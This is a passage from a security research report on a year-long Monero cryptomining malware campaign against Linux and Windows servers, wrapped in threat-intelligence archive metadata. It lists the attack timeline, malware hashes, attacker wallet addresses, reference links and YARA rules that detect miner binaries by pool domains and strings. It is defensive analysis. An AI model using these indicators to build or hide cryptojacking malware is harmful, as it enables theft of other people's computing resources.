Attacking a redis server [13]. ​**\n\n  - **Oct. 11, 2017: Cryptomining attack abusing Kubernetes [15]. ​**\n\n  - **Nov. 20, 2017: Joe Sandbox file analysis of a malicious script starting a ​**\ncryptomining process with the same wallet [11].\n\n  - **Nov. 30, 2017: The malicious script shared on PasteBin [22]. ​**\n\n  - **Dec. 14, 2017: Cryptomining attack in Windows via Powershell [21]. ​**\n\n  - **Dec. 25, 2017: Reverse.it file analysis of a malicious script starting a ​**\ncryptomining process with the same wallet [12].\n\n  - **Jan. 03, 2018: The malicious script shared on PasteBin [23]. ​**\n\n2 41e2vPcVux9NNeTfWe8TLK2UWxCXJvNyCQtNb69YEexdNs711jEaDRXWbwaVe4vUMveKAzAiA4j8xgUi29TpKXpm3zKTUYo ​\n\n\n-----\n\n  - **Jan. 12, 2018: The malicious script shared on PasteBin [24]. ​**\n\n  - **Jan. 13, 2018: The malicious script for Windows shared on PasteBin [22]. ​**\n\n  - **Jan. 23, 2018: Cryptomining attack in Windows via Powershell [20]. ​**\n\n  - **Feb. 06, 2018: The malicious script shared on PasteBin [25]. ​**\n\n  - **Mar. 16, 2018: Cryptomining attack in Windows via Powershell [16]. ​**\n\n  - **Apr. 06, 2018: CouchDB 2.1.0 attacked for cryptomining activities [17]. ​**\n\n  - **Apr. 18, 2018: Drupal Servers exploited for cryptomining activities [18]. ​**\nAttackers exploit vulnerability CVE-2018-7600 on Drupal servers.\n\n  - **Apr. 19, 2018: Ubuntu Server 16.04 compromised by crypto miner [19]. ​**\n\n  - **Apr. 29, 2018: A new version of the malicious script is shared on PasteBin ​**\n\n[14].\n\nThe information retrieved from all these reports in the last year indicate that the threat actors\nwere prepared for exploiting different software vulnerabilities and multiple operating systems.\n\nApart from the previous detected attacks using the same Monero wallet, we found other\nmalware related with the use of ​this same wallet in VirusTotal. The following cryptomining\nmalware versions all use the same Wallet:\n\n**Virus** **First**\n\n**SHA256** **Total** **Submission** **Size** **Type** **Comment**\n\n**Score** **Date**\n\nf1e5fc21e0ea575783dc6b555083584c4e3b 801 Powershell script Oldest script\n11/59 2017-11-17\n647697ec6973fb7076f55a2c5118 bytes for Windows for Windows\n\n1ef429dd2e38a537b174adbee1dbf8aad33b Bash script for Oldest script\n21/58 2017-11-20 2.3 KB\n5dbd207192b015ebd6eff34a879c Linux for Linux\n\n|SHA256|Virus Total Score|First Submission Date|Size|Type|Comment|\n|---|---|---|---|---|---|\n|f1e5fc21e0ea575783dc6b555083584c4e3b 647697ec6973fb7076f55a2c5118|11/59|2017-11-17|801 bytes|Powershell script for Windows|Oldest script for Windows|\n|1ef429dd2e38a537b174adbee1dbf8aad33b 5dbd207192b015ebd6eff34a879c|21/58|2017-11-20|2.3 KB|Bash script for Linux|Oldest script for Linux|\n|fd4a5a696bee8c5ab0ea68f071fd3938b531 52c3e6fe6bacbe395a0b8df6d254|20/59|2017-12-26|4.1 KB|Bash script for Linux||\n|7394149d657d90d57cf1f80c0c1aef6c7cbb 3cad5f63e1f1ce0cb9aa68c13887|5/59|2017-12-26|4.1 KB|Bash script for Linux||\n|54088e34c1fab1f837be90c8125faf36a275 e9b9db83d1da79cf776b1b35bcfb|5/60|2018-01-08|4.3 KB|Bash script for Linux||\n|dd93f36dd1b18ca4a2ad46a17fd9ac5991f7 20c0627fabe07a87e4e3b8cd7ea9|23/59|2018-01-30|8.0 KB|Bash script for Linux||\n|fa5777aac8a628589289ce52ea18ae08b33a 6f057811281dc442c812b8fc21b7|12/54|2018-02-08|8.0 KB|Bash script for Linux||\n|5d61c7cecee81eb73e77f60d63cf2f03382d eaa5fd8392b983c8a96ff912d264|20/58|2018-02-13|8.0 KB|Bash script for Linux||\n|fa1c458b4b7458b79dfa5fa8ffdd297e35a8 c27570c388ca271305ca1e6769f7|12/58|2018-02-20|4.1 KB|Bash script for Linux||\n|19c257223cc8dfee933d2ab8a64716368304 7e25e97f029a08d8fec7edb9a0b6|7/59|2018-02-20|8.0 KB|Bash script for Linux|Script used in this attack|\n|1e43eac49ff521912db16f7a1c6b16500f78 18de9f93bb465724add5b4724a13|27/59|2018-03-04|8.0 KB|Bash script for Linux||\n|9b555a9f32b1a5db5b23756552531187ee39 3e057eb7ffd57ebc8d05601b7609|21/56|2018-03-04|2.1 KB|Powershell script for Windows||\n\n\n-----\n\nec2ab9a279d73f8ee26cf47bced5a00dd540 Bash script for Attacks\n0/59 2018-05-15 1.5 KB\ne75469d098a0f5f0a44d69a4a935 Linux against docker\n\nf4d1441b956ff153bde028e78c1ecd4d085c Bash script for\n3/56 2018-05-18 11.0 KB\n59bae001c979845bfe3077699e35 Linux\n\n222e84e81e50a3711f285f13b2df0e4b516f Bash script for\n4/60 2018-05-19 10.8 KB\n4f1b8ef88e9e9c579116b039df78 Linux\n\nInterestingly, during our analysis we found binaries that were design to explicitly kill any\nprocess in the compromised server that was using the same wallet discussed above. One of\nsuch samples was:\n\n  - 1c16ccf341840120598b910b2b2b858e35d4e92610c357f24f1c6da24f59341f\n\n    - First seen in VirusTotal: 2018-04-26\n\n    - Type of file: Bash script for Linux\n\n    - Kills all the processes using the current wallet​ we investigate plus other 3 ​\nwallets presumably related with competition miners. Therefore this script\nprobably does not belong to the same attackers.\n\n|a2e687d7e627b32100c8cd7d5cdfa334169e a6d29e94dda899915f780b80000f|24/59|2018-03-04|2.1 KB|Powershell script for Windows|Col6|\n|---|---|---|---|---|---|\n|a88ee13e645bcbbf62a08e66f41975cbedd7 03661bbde774eb2aed2b3ac71412|16/60|2018-03-04|8.0 KB|Bash script for Linux||\n|b28e44a3cc5a9a78cf96cda67295a35b0d98 569fcd81f0c95063a3b0197c5c81|15/59|2018-03-04|8.1 KB|Bash script for Linux||\n|b4657c04eb6c1da95edd40e8d3e15f5d0262 5a6e92afc37ae278f95de7b1ab91|22/59|2018-03-04|8.4 KB|Bash script for Linux||\n|c9e89fc49706aae347ce5ec5067ca9cd57c9 c6b92841567543de51e0a17e152e|15/60|2018-03-04|8.0 KB|Bash script for Linux||\n|e2403b8198fc3dfdac409ea3ce313bbf12b4 64b60652d7e2e1bc7d6c356f7e5e|24/59|2018-03-04|8.0 KB|Bash script for Linux||\n|ecaa914472297d1d00a390ec50596aefd748 6a67777892237f5290395818b584|15/60|2018-03-04|8.1 KB|Bash script for Linux||\n|5d0850bde9a9725ea0c433e9a599db0f929b 2dcb1a7a25b09276e7d95dfb5ba5|23/59|2018-03-16|2.3 KB|Powershell script for Windows||\n|c24d69e63120e4fb180f7fc1e38017264e44 8817075855cdb82d746d346d26cd|24/56|2018-03-16|6.9 KB|Bash script for Linux||\n|4186517778ea8c77b5d1073186660dc4cdfd 3048365e925e0408e6259f70595b|24/59|2018-03-20|2.3 KB|Powershell script for Windows||\n|c6d303c3a93cc56262be93f9b0c96a241f0e 5d31c7020763aa80f887acb339e4|14/57|2018-03-20|2.3 KB|Powershell script for Windows||\n|5332a6cf0ed9e202a5c18f24fe4bf7795006 ec115c1556f8d3af65f6779ebfe9|18/59|2018-04-23|2.3 KB|Powershell script for Windows||\n|968dd3fb76d1b73b162ec3de5ada77182107 5104630cbc627de3ba2c70ccbdce|0/59|2018-04-26|10.4 KB|Bash script for Linux||\n|db21d6e3fc4a068351bafa0d521610342f05 0eb4047fe2709338f990a108f1e1|1/60|2018-04-26|10.5 KB|Bash script for Linux||\n|ec2ab9a279d73f8ee26cf47bced5a00dd540 e75469d098a0f5f0a44d69a4a935|0/59|2018-05-15|1.5 KB|Bash script for Linux|Attacks against docker|\n|f4d1441b956ff153bde028e78c1ecd4d085c 59bae001c979845bfe3077699e35|3/56|2018-05-18|11.0 KB|Bash script for Linux||\n|222e84e81e50a3711f285f13b2df0e4b516f 4f1b8ef88e9e9c579116b039df78|4/60|2018-05-19|10.8 KB|Bash script for Linux||\n\n\n-----\n\n- 4Ab9s1RRpueZN2XxTM3vDWEHcmsMoEMW3YYsbGUwQSrNDfgMKVV\n8GAofToNfyiBwocDYzwY5pjpsMB7MY8v4tkDU71oWpDC\n\n- 47sghzufGhJJDQEbScMCwVBimTuq6L5JiRixD8VeGbpjCTA12noXmi4Zy\nBZLc99e66NtnKff34fHsGRoyZk3ES1s1V4QVcB\n\n- 44iuYecTjbVZ1QNwjWfJSZFCKMdceTEP5BBNp4qP35c53Uohu1G7tDm\nShX1TSmgeJr2e9mCw2q1oHHTC2boHfjkJMzdxumM\n\n\n-----\n\n# Conclusions\n\nIn this report we analyzed and studied a Monero cryptomining intrusion against a web server in\none of our partner organizations. The analysis led to the discovery that this was not the first\ntime the organization was attacked by this type of threat. The attack was not targeted to the\norganization, but it was part of a bigger and global campaign.\n\nWe uncovered cryptomining attacks from the same threat actor that spanned more than a year.\nThe threat actor has the resources to actively exploit different applications and operating\nsystems, adapting to new vulnerabilities. The wallet used in this attack was blocked many\nmonths before the current intrusion. The use of Monero for cryptomining reduces our ability to\nfind more information of the attackers as Monero provides strong privacy for its users. The\ncurrent attack seems to be part of a trend in small but powerful malware that seeks quick\nprofit.\n\nThe actors behind these attack seem to have a small infrastructure of servers but at the same\ntime they have a large coverage of different malware and infections. By using simple bash\nscripts they may look like simple attackers, but they are important enough to generate 29\ndifferent malware using the same cryptocurrency wallet.\n\n\n-----\n\n# References\n\n[1] \"Jenkins Miner: One of the Biggest Mining Operations Ever Discovered.\" Check Point\nResearch. February 15, 2018. Accessed May 15, 2018. Website:\n[https://research.checkpoint.com/jenkins-miner-one-biggest-mining-operations-ever-discovere](https://research.checkpoint.com/jenkins-miner-one-biggest-mining-operations-ever-discovered/)\n[d/](https://research.checkpoint.com/jenkins-miner-one-biggest-mining-operations-ever-discovered/)\n\n[2] “Vulnerabilities in Apache CouchDB Open the Door to Monero Miners - TrendLabs Security\nIntelligence Blog.\" Trend Micro, Inc. February 15, 2018. Accessed May 15, 2018. Website:\n[https://blog.trendmicro.com/trendlabs-security-intelligence/vulnerabilities-apache-couchdb-op](https://blog.trendmicro.com/trendlabs-security-intelligence/vulnerabilities-apache-couchdb-open-door-monero-miners/)\n[en-door-monero-miners/](https://blog.trendmicro.com/trendlabs-security-intelligence/vulnerabilities-apache-couchdb-open-door-monero-miners/)\n\n[3] Pingios, Anastasios. \"The Kworker Linux Crypto miner Malware.\" December 13, 2017.\nAccessed May 15, 2018. Website:\n[https://xorl.wordpress.com/2017/12/13/the-kworker-linux-cryptominer-malware/](https://xorl.wordpress.com/2017/12/13/the-kworker-linux-cryptominer-malware/)\n\n[4] “Oracle WebLogic Vulnerability Being Exploited by Bitcoin Miners.” REN-ISAC Advisory.\nJanuary 5, 2018. Accessed May 15, 2018. Website:\n[https://www.ren-isac.net/public-resources/alerts/REN-ISAC_ADVISORY_Oracle_WebLogic_Vul](https://www.ren-isac.net/public-resources/alerts/REN-ISAC_ADVISORY_Oracle_WebLogic_Vulnerability_Bitcoin_Miner_Attacks_20180105v1.pdf)\n[nerability_Bitcoin_Miner_Attacks_20180105v1.pdf](https://www.ren-isac.net/public-resources/alerts/REN-ISAC_ADVISORY_Oracle_WebLogic_Vulnerability_Bitcoin_Miner_Attacks_20180105v1.pdf)\n\n[5] \"CVE-2017-1000353.\" Common Vulnerabilities and Exposures (CVE®)​ . January 29, 2018. ​\nAccessed May 15, 2018. Website:\n[http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-1000353. ​](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-1000353)\n\n[6] “XMRig hackers”. January 3rd, 2018. Website:\n[https://www.reddit.com/r/MoneroMining/comments/7nv8h6/xmrig_hackers/](https://www.reddit.com/r/MoneroMining/comments/7nv8h6/xmrig_hackers/)\n\n[7] “Yet Another Crypto Mining Botnet?“. Website:\n[https://www.fortinet.com/blog/threat-research/yet-another-crypto-mining-botnet.html](https://www.fortinet.com/blog/threat-research/yet-another-crypto-mining-botnet.html)\n\n[8] VirusTotal Analysis Report. Website:\n[https://www.virustotal.com/en/file/63210b24f42c05b2c5f8fd62e98dba6de45c7d751a2e55700](https://www.virustotal.com/en/file/63210b24f42c05b2c5f8fd62e98dba6de45c7d751a2e55700d22983772886017/analysis/)\n[d22983772886017/analysis/](https://www.virustotal.com/en/file/63210b24f42c05b2c5f8fd62e98dba6de45c7d751a2e55700d22983772886017/analysis/)\n\n[9] “Malicious service in DC/OS. Known vulnerabilities?”. June 2, 2017. Accessed May 31,\n2018. Website: [https://groups.google.com/a/dcos.io/forum/#!topic/users/NF4wMQ2VrJ8 ​](https://groups.google.com/a/dcos.io/forum/#!topic/users/NF4wMQ2VrJ8)\n\n[10] “CentOS Server Records Due to Mining Project Minerd Intrusion Event Due to Redis”. July\n18, 2017. Accessed May 31, 2018. Website:\n[https://blog.csdn.net/Dancen/article/details/75313424](https://blog.csdn.net/Dancen/article/details/75313424)\n\n[11] “Joe Sandbox Cloud Analysis Report”. Website:\n[https://www.joesandbox.com/analysis/37564/0/html](https://www.joesandbox.com/analysis/37564/0/html)\n\n[12] “ReverseIT Analysis Report”. Website:\n[https://www.reverse.it/sample/68aa5e5a1bf7fc7e6101c78cb484555b750d253f99dd8f8f08cb8e](https://www.reverse.it/sample/68aa5e5a1bf7fc7e6101c78cb484555b750d253f99dd8f8f08cb8e81ceaf6a31?environmentId=300)\n[81ceaf6a31?environmentId=300](https://www.reverse.it/sample/68aa5e5a1bf7fc7e6101c78cb484555b750d253f99dd8f8f08cb8e81ceaf6a31?environmentId=300)\n\n[13] REDIS. August 4, 2017. Accessed May 31, 2018. Website:\n[https://www.kancloud.cn/daydaygo/daydaygo_wiki/371890](https://www.kancloud.cn/daydaygo/daydaygo_wiki/371890)\n\n[14] “Untitled PasteBin”. April 29, 2018. Accessed May 31, 2018. Website:\n[https://pastebin.com/8bvST97K](https://pastebin.com/8bvST97K)\n\n\n-----\n\n[15] “Kubernetes and minerd”. October 11, 2017. Accessed May 31, 2018. Website:\n[http://www.cnblogs.com/birdstudio/p/7650622.html](http://www.cnblogs.com/birdstudio/p/7650622.html)\n\n[16] “Security at MIT”. May 14, 2018. Accessed May 31, 2018. Website:\n[https://css.csail.mit.edu/6.858/2018/lec/l23-mit-ist.pptx](https://css.csail.mit.edu/6.858/2018/lec/l23-mit-ist.pptx)\n\n[17] Abuse report on IP. April 6, 2018. Accessed May 31, 2018. Website:\n[https://www.abuseipdb.com/check/192.99.142.232](https://www.abuseipdb.com/check/192.99.142.232)\n\n[18] “Drupalgeddon 2: Profiting from Mass Exploitation”. April 16, 2018. Accessed May 31,\n2018. Website:\n[https://www.volexity.com/blog/2018/04/16/drupalgeddon-2-profiting-from-mass-exploitation/](https://www.volexity.com/blog/2018/04/16/drupalgeddon-2-profiting-from-mass-exploitation/)\n\n[19] “suppoie malware removal (script hidden in .jpg).” April 19, 2018. Accessed May 31, 2018.\nWebsite:\n[https://askubuntu.com/questions/1026545/suppoie-malware-removal-script-hidden-in-jpg](https://askubuntu.com/questions/1026545/suppoie-malware-removal-script-hidden-in-jpg)\n\n[20] “CMD and Powershell keeping opening on background (nsm.exe on TEMP folder)”.\nJanuary 23, 2018. Accessed May 31, 2018. Website:\n[https://forums.malwarebytes.com/topic/219497-cmd-and-powershell-keeping-opening-on-bac](https://forums.malwarebytes.com/topic/219497-cmd-and-powershell-keeping-opening-on-background-nsmexe-on-temp-folder/)\n[kground-nsmexe-on-temp-folder/](https://forums.malwarebytes.com/topic/219497-cmd-and-powershell-keeping-opening-on-background-nsmexe-on-temp-folder/)\n\n[21] URLScan.IO Analysis Report. December 14, 2017. Accessed May 31, 2018. Website:\n[https://urlscan.io/result/67f5f30d-88ae-4d2b-acad-956de60e5f04/forms/](https://urlscan.io/result/67f5f30d-88ae-4d2b-acad-956de60e5f04/forms/)\n\n[22] “Untitled PasteBin”. November 30, 2017. Accessed May 31, 2018. Website:\n[https://pastebin.com/hLGasbqu](https://pastebin.com/hLGasbqu)\n\n[23] “juanked”. January 3, 2018. Accessed May 31, 2018. Website:\n[https://pastebin.com/zfEvhZ6c](https://pastebin.com/zfEvhZ6c)\n\n[24] “Untitled PasteBin”. January 12, 2018. Accessed May 31, 2018. Website:\n[https://pastebin.com/bHHcCdpr](https://pastebin.com/bHHcCdpr)\n\n[25] “wls_vuln_attempt_67.231.243.10_1.ps1”. January 13, 2018. Accessed May 31, 2018.\nWebsite: [https://pastebin.com/ctisSMcY​](https://pastebin.com/ctisSMcY)\n\n\n-----\n\n# Appendix A: Information on malware sample 4fa4269b7ce44bfce5ef574e6a37c38f\n\nThis technical appendix summarizes the external information we gathered about the malware.\n\n## Malware identification\n\n**MD5: 4fa4269b7ce44bfce5ef574e6a37c38f​**\n**SHA256: 63210b24f42c05b2c5f8fd62e98dba6de45c7d751a2e55700d22983772886017**\n**SIZE: 2.8 MB**\n**Virus Total:**\n**[https://www.virustotal.com/#/file/4fa4269b7ce44bfce5ef574e6a37c38f](https://www.virustotal.com/#/file/4fa4269b7ce44bfce5ef574e6a37c38f)**\n\n**-** **First submission: 2016-07-05 02:11:32 UTC**\n**-** **Last submission: 2018-05-14 23:55:45 UTC**\n**-** **First seen in the wild: 2015-03-27 04:37:01**\n\n## Malware reports\n\n**Indicators of compromise.**\n\n  - [https://vms.drweb.com/virus/?_is=1&amp;i=8400823](https://vms.drweb.com/virus/?_is=1&amp;i=8400823)\n\n  - [https://otx.alienvault.com/pulse/57ad94a9e083f4013526d2dc](https://otx.alienvault.com/pulse/57ad94a9e083f4013526d2dc)\n\n**Other mentions of the malware.**\n\n  - [https://www.scumware.org/report/4FA4269B7CE44BFCE5EF574E6A37C38F.html](https://www.scumware.org/report/4FA4269B7CE44BFCE5EF574E6A37C38F.html)\n\n  - [http://r.virscan.org/report/696c4a1270b0cb2f0e62532b676ab957](http://r.virscan.org/report/696c4a1270b0cb2f0e62532b676ab957)\n\n  - [https://detux.org/report.php?sha256=63210b24f42c05b2c5f8fd62e98dba6de45c7d751](https://detux.org/report.php?sha256=63210b24f42c05b2c5f8fd62e98dba6de45c7d751a2e55700d22983772886017)\n[a2e55700d22983772886017](https://detux.org/report.php?sha256=63210b24f42c05b2c5f8fd62e98dba6de45c7d751a2e55700d22983772886017)\n\n  - [https://www.hybrid-analysis.com/sample/63210b24f42c05b2c5f8fd62e98dba6de45c7d](https://www.hybrid-analysis.com/sample/63210b24f42c05b2c5f8fd62e98dba6de45c7d751a2e55700d22983772886017?environmentId=120)\n[751a2e55700d22983772886017?environmentId=120](https://www.hybrid-analysis.com/sample/63210b24f42c05b2c5f8fd62e98dba6de45c7d751a2e55700d22983772886017?environmentId=120)\n\n\n-----\n\n**VirusTotal Graph of relationships.**\n\nSource:\n[https://www.virustotal.com/graph/63210b24f42c05b2c5f8fd62e98dba6de45c7d751a2e55700d2298377](https://www.virustotal.com/graph/63210b24f42c05b2c5f8fd62e98dba6de45c7d751a2e55700d22983772886017?src=minigraph#/selected/n63210b24f42c05b2c5f8fd62e98dba6de45c7d751a2e55700d22983772886017/drawer/node-summary)\n[2886017?src=minigraph#/selected/n63210b24f42c05b2c5f8fd62e98dba6de45c7d751a2e55700d22983](https://www.virustotal.com/graph/63210b24f42c05b2c5f8fd62e98dba6de45c7d751a2e55700d22983772886017?src=minigraph#/selected/n63210b24f42c05b2c5f8fd62e98dba6de45c7d751a2e55700d22983772886017/drawer/node-summary)\n[772886017/drawer/node-summary](https://www.virustotal.com/graph/63210b24f42c05b2c5f8fd62e98dba6de45c7d751a2e55700d22983772886017?src=minigraph#/selected/n63210b24f42c05b2c5f8fd62e98dba6de45c7d751a2e55700d22983772886017/drawer/node-summary)\n\n\n-----\n\n# Appendix B: YARA rules for miner detections\n\n**rule possible_cryptominer_minerd**\n**{**\n\n**meta:**\n\n**author = \"Joachim Suico, CivilSphere\"**\n**date = \"1/23/2018\"**\n**description = \"rule for executables based on minerd software (supports**\n**various coins)\"**\n\n**reference = \"https://github.com/pooler/cpuminer\"**\n\n**strings:**\n\n**$crypto = \"crypto\" ascii nocase**\n**$cpuminer = \"cpuminer\" ascii nocase**\n\n**$minerd1 = \"minerd --help\" ascii nocase**\n**$minerd2 = \"minerd [OPTIONS]\" ascii nocase**\n\n**//author related information**\n**$author1 = \"Miner by yvg1900\" ascii nocase**\n**$author2 = \"yvg1900@gmail.com\" ascii nocase**\n**$author3 = \"MINERGATE\" ascii**\n\n**//some supported coins**\n**$coin1 = \"MemoryCoin\" ascii**\n**$coin2 = \"MaxCoin\" ascii**\n**$coin3 = \"DiamondCoin\" ascii**\n**$coin4 = \"DvoraKoin\" ascii**\n**$coin5 = \"MyriadCoin\" ascii**\n**$coin6 = \"ByteCoin\" ascii**\n**$coin7 = \"QuazarCoin\" ascii**\n**$coin8 = \"FantomCoin\" ascii**\n**$coin9 = \"GroestlCoin\" ascii**\n**$coin10 = \"ProtoSharesCoin\" ascii**\n**$coin11 = \"MoneroCoin\" ascii**\n\n**//sites to forward mined hashes**\n**$site1 = \"pool.minexmr.com\" ascii nocase**\n**$site2 = \"monero.crypto-pool.fr\" ascii nocase**\n**$site3 = \"pool.cryptoescrow.eu\" ascii nocase**\n**$site4 = \"xmr.hashinvest\" ascii nocase**\n**$site5 = \"monero.farm\" ascii nocase**\n**$site6 = \"cryptonotepool.org.uk\" ascii nocase**\n**$site7 = \"monerominers.net\" ascii nocase**\n**$site8 = \"extremepool.org\" ascii nocase**\n**$site9 = \"mine.moneropool.org\" ascii nocase**\n**$site10 = \"mmcpool.com\" ascii nocase**\n\n\n-----\n\n**$site11 = \"dwarfpool.com\" ascii nocase**\n**$site12 = \"maxcoinpool.com\" ascii nocase**\n**$site13 = \"coinedpool.com\" ascii nocase**\n**$site14 = \"mining4all.eu\" ascii nocase**\n**$site15 = \"nut2pools.com\" ascii nocase**\n**$site16 = \"rocketpool.co.uk\" ascii nocase**\n**$site17 = \"miningpoolhub.com\" ascii nocase**\n**$site18 = \"nonce-pool.com\" ascii nocase**\n**$site19 = \"p2poolcoin.com\" ascii nocase**\n**$site20 = \"cryptity.com\" ascii nocase**\n**$site21 = \"extremepool.com\" ascii nocase**\n**$site22 = \"crypto-pool.fr\" ascii nocase**\n**$site23 = \"cryptoescrow.eu\" ascii nocase**\n**$site24 = \"moneropool.com\" ascii nocase**\n**$site25 = \"coinmine.pl\" ascii nocase**\n**$site26 = \"moneropool.com.br\" ascii nocase**\n**$site27 = \"moneropool.org\" ascii nocase**\n**$site28 = \"cryptohunger.com\" ascii nocase**\n\n**condition:**\n\n**(is_elf or is_pe) and**\n**((#crypto > 10 and #cpuminer > 3 and all of ($minerd*)) or**\n**(#crypto > 3 and 1 of ($author*) and 1 of ($coin*) and 1 of ($site*)))**\n\n**}**\n\n**rule possible_cryptominer_xmrig**\n**{**\n\n**meta:**\n\n**author = \"Joachim Suico, CivilSphere\"**\n**date = \"1/23/2018\"**\n**description = \"rule for executables based on XMRig (monero miner)\"**\n**reference = \"https://github.com/xmrig/xmrig\"**\n\n**strings:**\n\n**$c1 = \"crypto\" ascii nocase**\n\n**$x1 = \"xmrig\" ascii nocase**\n\n**$m1 = \"xmrig [OPTIONS]\" ascii nocase**\n**$m2 = \"minergate.com\" ascii nocase**\n\n**condition:**\n\n**(is_elf or is_pe) and #c1 > 4 and #x1 > 5 and any of ($m*)**\n**}**\n\n\n-----\n\n**rule is_pe**\n**{**\n\n**condition:**\n\n**uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550**\n**}**\n\n**rule is_elf**\n**{**\n\n**strings:**\n\n**$elf = { 7f 45 4c 46 }**\n**condition:**\n\n**$elf in (0..4)**\n**}**\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5910e58f-4bc9-4e4e-9dbb-887804094a01",
            "created_at": "2022-10-25T16:32:58.457399Z",
            "updated_at": "2022-10-25T16:32:58.457399Z",
            "deleted_at": null,
            "name": "OTX",
            "url": "https://otx.alienvault.com",
            "description": "Alienvault Open Threat Exchange (OTX)",
            "reports": null
        }
    ],
    "references": [
        "https://static1.squarespace.com/static/5b588ac24eddeca055a9e40e/t/5b64233688251b91628d2f83/1533289280041/Malware+attacks+on+Linux+servers+to+run+cryptocurrency+miners.+A+real+case+analysis.pdf"
    ],
    "report_names": [
        "Malware+attacks+on+Linux+servers+to+run+cryptocurrency+miners.+A+real+case+analysis.pdf"
    ],
    "threat_actors": [
        {
            "id": "eb3f4e4d-2573-494d-9739-1be5141cf7b2",
            "created_at": "2022-10-25T16:07:24.471018Z",
            "updated_at": "2025-03-27T02:02:10.24394Z",
            "deleted_at": null,
            "main_name": "Cron",
            "aliases": [],
            "source_name": "ETDA:Cron",
            "tools": [
                "Catelites",
                "Catelites Bot",
                "CronBot",
                "TinyZBot"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716501,
    "ts_updated_at": 1743041369,
    "ts_creation_date": 0,
    "ts_modification_date": 0,
    "files": {
        "pdf": "https://archive.orkl.eu/440a9f2f686b8b951b78f0574ddd53329c9b531b.pdf",
        "text": "https://archive.orkl.eu/440a9f2f686b8b951b78f0574ddd53329c9b531b.txt",
        "img": "https://archive.orkl.eu/440a9f2f686b8b951b78f0574ddd53329c9b531b.jpg"
    }
}